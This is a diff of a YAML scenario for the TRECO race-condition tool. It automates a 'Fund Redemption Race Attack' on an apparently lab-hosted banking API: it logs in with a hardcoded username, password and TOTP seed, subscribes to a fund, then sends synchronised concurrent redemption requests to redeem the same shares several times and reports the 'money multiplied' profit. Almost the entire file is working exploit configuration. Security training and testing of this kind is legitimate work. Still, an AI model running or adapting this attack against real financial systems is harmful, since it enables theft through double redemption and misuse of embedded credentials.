@@ -22,23 +22,27 @@ metadata:
     Server fails to properly synchronize redemption operations, allowing
     multiple redemptions of the same investment - money multiplication.
 
-config:
-  host: "bankao-api.hacknroll.academy"
-  port: 443
+target:
+  host: "bankao-api.local"
+  port: 80
   threads: 20
   reuse_connection: false
   tls:
-    enabled: true
-    verify_cert: true
+    enabled: false
+    verify_cert: false
+  # proxy:
+  #   type: http
+  #   host: 127.0.0.1
+  #   port: 8080
 
-entrypoints:
-  - state: auth_login
-    input:
-      username: "crash"
-      password: "bhack123"
-      totp_seed: "OZDIJJEHAXPAGSBXPG5TLGDIZKFR7YNT"
-      subscribe_amount: 200
-      redeem_amount: 20
+entrypoint:
+  state: auth_login
+  input:
+    username: "crash"
+    password: "bhack123"
+    totp_seed: "OZDIJJEHAXPAGSBXPG5TLGDIZKFR7YNT"
+    subscribe_amount: 200
+    redeem_amount: 20
 
 # ============================================================================
 # STATES
@@ -54,7 +58,7 @@ states:
     description: "Login with credentials"
     request: |
       POST /login HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/json
       
       {"username": "{{ username }}", "password": "{{ password }}"}
@@ -67,12 +71,12 @@ states:
     logger:
       on_state_enter: |
 
-        ╔══════════════════════════════════════════════════════════════╗
-        ║  🦎 TRECO - Fund Redemption Race Attack                      ║
-        ╠══════════════════════════════════════════════════════════════╣
-        ║  🎯 Target: {{ config.host }}
-        ║  👤 User:   {{ username }}
-        ╚══════════════════════════════════════════════════════════════╝
+        ╔═════════════════════════════════════════════════════════════════════╗
+        ║  🦎 TRECO - Fund Redemption Race Attack                             ║
+        ╠═════════════════════════════════════════════════════════════════════╣
+        ║  🎯 Target: {{ "%-55s" | format(target.host)                     }} ║
+        ║  👤 User:   {{ "%-55s" | format(username)                        }} ║
+        ╚═════════════════════════════════════════════════════════════════════╝
 
       on_state_leave: |
         🔐 Login successful → temp token received
@@ -87,7 +91,7 @@ states:
     description: "TOTP verification"
     request: |
       POST /2fa HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/json
       Authorization: Bearer {{ auth_login.temp_token }}
       
@@ -124,7 +128,7 @@ states:
     description: "Get initial balance"
     request: |
       GET /balance HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Authorization: Bearer {{ auth_2fa.token }}
 
     extract:
@@ -141,13 +145,29 @@ states:
 
     next:
       - on_status: 200
+        goto: redemption
+
+  redemption:
+    description: "Redeem shared"
+    request: |
+      POST /redemption HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/json
+      Authorization: Bearer {{ auth_2fa.token }}
+      
+      {"amount": 2000}
+
+    next:
+      - on_status: 200
+        goto: subscribe_fund
+      - on_status: 400
         goto: subscribe_fund
 
   subscribe_fund:
     description: "Subscribe to fund"
     request: |
       POST /subscribe HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/json
       Authorization: Bearer {{ auth_2fa.token }}
       
@@ -176,17 +196,19 @@ states:
   race_redemption:
     description: "Race condition - redeem same shares multiple times"
     request: |
-      POST /redemption HTTP/1.1
-      Host: {{ config.host }}
+      POST /redemption HTTP/2
+      Host: {{ target.host }}
       Content-Type: application/json
       Authorization: Bearer {{ auth_2fa.token }}
       
-      {"amount": {{ redeem_amount }}}
+      {
+        "amount": {{ redeem_amount }}
+      }
 
     race:
-      threads: 5
+      threads: 2
       sync_mechanism: barrier
-      connection_strategy: preconnect
+      connection_strategy: multiplexed
       thread_propagation: single
 
     extract:
@@ -203,14 +225,14 @@ states:
     logger:
       on_state_enter: |
 
-        ┌──────────────────────────────────────────────────────────────┐
-        │  ⚡ RACE ATTACK                                              │
-        ├──────────────────────────────────────────────────────────────┤
-        │  🔗 Endpoint:  POST /redemption                              │
-        │  🧵 Threads:   20                                            │
-        │  🔧 Strategy:  preconnect + barrier                          │
-        │  💵 Amount:    {{ redeem_amount }} shares each                          │
-        └──────────────────────────────────────────────────────────────┘
+        ┌──────────────────────────────────────────────────────────────────────────────┐
+        │  ⚡ RACE ATTACK                                                              │
+        ├──────────────────────────────────────────────────────────────────────────────┤
+        │  🔗 Endpoint:  POST /redemption                                              │
+        │  🧵 Threads:   20                                                            │
+        │  🔧 Strategy:  preconnect + barrier                                          │
+        │  💵 Shares:    {{ "%-61s" | format(redeem_amount)                         }} │
+        └──────────────────────────────────────────────────────────────────────────────┘
 
       on_thread_leave: |
         {% if response.status_code == 200 %}
@@ -239,7 +261,7 @@ states:
     description: "Get final balance"
     request: |
       GET /balance HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Authorization: Bearer {{ auth_2fa.token }}
 
     extract:
@@ -256,28 +278,28 @@ states:
         {% set final = get_final_balance.cash | float %}
         {% set diff = final - initial %}
 
-        ┌──────────────────────────────────────────────────────────────┐
-        │  📊 RESULTS                                                  │
-        ├──────────────────────────────────────────────────────────────┤
-        │  💵 Initial Cash:    ${{ get_initial_balance.cash }}
-        │  💵 Final Cash:      ${{ get_final_balance.cash }}
-        │  📈 Initial Shares:  {{ get_initial_balance.shares }}
-        │  📈 Final Shares:    {{ get_final_balance.shares }}
-        ├──────────────────────────────────────────────────────────────┤
-        │  📉 Subscribed:      ${{ subscribe_amount }}
-        │  💰 Net Change:      ${{ diff }}
+        ┌──────────────────────────────────────────────────────────────────────────────┐
+        │  📊 RESULTS                                                                  │
+        ├──────────────────────────────────────────────────────────────────────────────┤
+        │  💵 Initial Cash:    ${{ "%-54s" | format(get_initial_balance.cash)       }} │
+        │  💵 Final Cash:      ${{ "%-54s" | format(get_final_balance.cash)         }} │
+        │  📈 Initial Shares:   {{ "%-54s" | format(get_initial_balance.shares)     }} │
+        │  📈 Final Shares:     {{ "%-54s" | format(get_final_balance.shares)       }} │
+        ├──────────────────────────────────────────────────────────────────────────────┤
+        │  📉 Subscribed:      ${{ "%-54s" | format(subscribe_amount)               }} │
+        │  💰 Net Change:      ${{ "%-54s" | format(diff)                           }} │
         {% if diff > 0 %}
-        ├──────────────────────────────────────────────────────────────┤
-        │  🎉 VULNERABLE - Money multiplied!                           │
-        │  💸 Profit: ${{ diff }}
+        ├──────────────────────────────────────────────────────────────────────────────┤
+        │  🎉 VULNERABLE - Money multiplied!                                           │
+        │  💸 Profit: ${{ "%-64s" | format(diff)                                    }} │
         {% elif diff == 0 %}
-        ├──────────────────────────────────────────────────────────────┤
-        │  ⚠️  Break even - partial exploitation?                      │
+        ├──────────────────────────────────────────────────────────────────────────────┤
+        │  ⚠️  Break even - partial exploitation?                                      │
         {% else %}
-        ├──────────────────────────────────────────────────────────────┤
-        │  ✅ PROTECTED - No race condition                            │
+        ├──────────────────────────────────────────────────────────────────────────────┤
+        │  ✅ PROTECTED - No race condition                                            │
         {% endif %}
-        └──────────────────────────────────────────────────────────────┘
+        └──────────────────────────────────────────────────────────────────────────────┘
 
     next:
       - goto: end
